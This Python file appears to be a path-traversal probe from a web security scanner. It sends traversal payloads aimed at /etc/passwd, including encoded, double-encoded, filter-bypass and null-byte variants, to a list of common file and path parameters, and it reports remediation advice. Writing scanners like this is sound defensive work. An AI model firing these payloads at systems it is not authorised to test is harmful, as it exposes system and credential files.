#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Path traversal via query / form parameter.

Different from `path_traversal_static_serve` (R9-7 -- targets
static-mount routes like `/static/<traversal>`). This one targets
*query parameters* whose values get joined to a base directory:
`?file=../../../etc/passwd`. Generalises the rounds-3-7
extension-bypass / FTP-download probes which were Juice-Shop-
literal `/ftp/<file>%00.md` style.

Detection signal: GET candidate endpoints with traversal payloads
in the parameter; validate when the response body matches
`^root:x:0:0:` (Linux passwd) or the Windows hosts-file marker.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import urlencode, urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

TARGETS = (
    ("/",              ("file", "path", "page", "view", "include")),
    ("/download",      ("file", "filename", "f", "name", "doc")),
    ("/export",        ("file", "format", "name")),
    ("/preview",       ("file", "doc", "url")),
    ("/template",      ("file", "name", "tpl")),
    ("/view",          ("file", "page")),
    ("/api/files",     ("path", "name", "file")),
    ("/api/v1/files",  ("path", "name")),
    ("/api/file",      ("path", "name")),
    ("/serve",         ("file", "path")),
    ("/ftp",           ("file",)),                # JS literal
    ("/render",        ("template", "name")),
)

PAYLOADS = (
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",        # double-encoded
    "../../../etc/passwd%00",                      # null-byte trunc
)

PASSWD_RE = re.compile(r"^root:x:0:0:", re.MULTILINE)
WIN_RE = re.compile(r"\[boot loader\].*\[fonts\]", re.DOTALL)


class PathTraversalFilenameParamProbe(Probe):
    name = "path_traversal_filename_param"
    summary = ("Detects path traversal via query parameters by "
               "injecting traversal payloads into common file/path "
               "parameter names and looking for /etc/passwd content "
               "in the response.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--target", action="append", default=[],
            help="Additional path|param (e.g. '/dl|f'); repeatable.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        targets = list(TARGETS)
        for t in args.target or []:
            if "|" in t:
                p, n = t.split("|", 1)
                targets.append((p.strip(), (n.strip(),)))

        attempts: list[dict] = []
        confirmed: dict | None = None
        for path, params in targets:
            for pname in params:
                for payload in PAYLOADS:
                    qs = urlencode({pname: payload})
                    url = urljoin(origin, path) + "?" + qs
                    r = client.request("GET", url)
                    row: dict = {"path": path, "param": pname,
                                 "payload": payload,
                                 "status": r.status, "size": r.size}
                    if r.status == 200 and r.body:
                        text = r.text or ""
                        if PASSWD_RE.search(text):
                            row.update({"hit": "etc/passwd",
                                        "snippet": text[:200]})
                            confirmed = row
                            attempts.append(row)
                            break
                        if WIN_RE.search(text):
                            row.update({"hit": "windows hosts",
                                        "snippet": text[:200]})
                            confirmed = row
                            attempts.append(row)
                            break
                    attempts.append(row)
                if confirmed:
                    break
            if confirmed:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(
                    f"Confirmed: path traversal via query parameter "
                    f"at {origin}{confirmed['path']}"
                    f"?{confirmed['param']}={confirmed['payload']!r}. "
                    f"Response carries {confirmed['hit']} content."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Resolve the requested filename inside a fixed "
                    "root and refuse anything that escapes:\n"
                    "  - Use the language's path-canonicalisation "
                    "primitive (`path.resolve` / `os.path.realpath` / "
                    "`Paths.get(...).normalize()`) and assert the "
                    "resolved path starts with the configured root.\n"
                    "  - Refuse `..`, `%2e%2e`, `%252e`, NUL bytes "
                    "(`%00`), and double-encoded equivalents.\n"
                    "  - Better: don't take a filename from the user "
                    "at all. Map an opaque id to the file server-"
                    "side."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tried {len(attempts)} "
                     "path/param/payload combinations on "
                     f"{origin}; no /etc/passwd or Windows hosts "
                     "marker returned."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PathTraversalFilenameParamProbe().main()
